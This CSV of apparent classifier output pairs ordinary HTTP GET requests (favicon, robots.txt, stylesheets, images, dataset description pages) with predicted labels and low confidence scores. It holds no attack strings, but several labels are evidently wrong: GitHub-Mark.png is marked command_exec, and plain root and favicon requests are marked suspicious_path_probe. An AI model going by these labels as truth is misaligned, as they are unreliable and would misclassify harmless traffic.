row_idx,text,pred_label,max_prob
138,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
139,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
140,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
141,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
142,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
143,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
144,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
145,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
146,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
147,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
148,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
149,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
150,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
151,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
152,METHOD=GET PATH=/ads.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41103294491767883
153,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
154,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
155,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
156,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
157,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
158,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
159,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
160,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
161,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
162,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1 QUERY= PROTOCOL=HTTP/1.1,benign,0.6136957406997681
163,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5956102609634399
164,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2 QUERY= PROTOCOL=HTTP/1.1,benign,0.6024762392044067
165,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5899902582168579
166,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3 QUERY= PROTOCOL=HTTP/1.1,benign,0.587634265422821
167,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5773578882217407
168,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
169,METHOD=GET PATH=/Datasets%20Description/Network/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5613512396812439
170,METHOD=GET PATH=/Datasets%20Description/Network/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5314313173294067
171,METHOD=GET PATH=/Datasets%20Description/Network/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5432575941085815
172,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
173,METHOD=GET PATH=/Datasets%20Description/Network/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5891454815864563
174,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
175,METHOD=GET PATH=/Datasets%20Description/Network/smtp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5483987331390381
176,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
177,METHOD=GET PATH=/Datasets%20Description/Network/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5611499547958374
178,METHOD=GET PATH=/Datasets%20Description/Network/tunnel.html QUERY= PROTOCOL=HTTP/1.1,benign,0.550652801990509
179,METHOD=GET PATH=/Datasets%20Description/Network/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5772854089736938
180,METHOD=GET PATH=/Datasets%20Description/PE_malware/OPCleaver.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5422806739807129
181,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
182,METHOD=GET PATH=/Datasets%20Description/PE_malware/Zeus.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5371832251548767
183,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
184,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
185,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
186,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
187,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
188,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
189,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
190,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
191,METHOD=GET PATH=/self.logs/access.log.2019-10-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4570903480052948
192,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
193,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
194,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
195,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
196,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
197,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
198,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
199,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
200,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
201,METHOD=GET PATH=/self.logs/error.log.2019-01-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4206598103046417
202,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
203,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
204,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
205,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
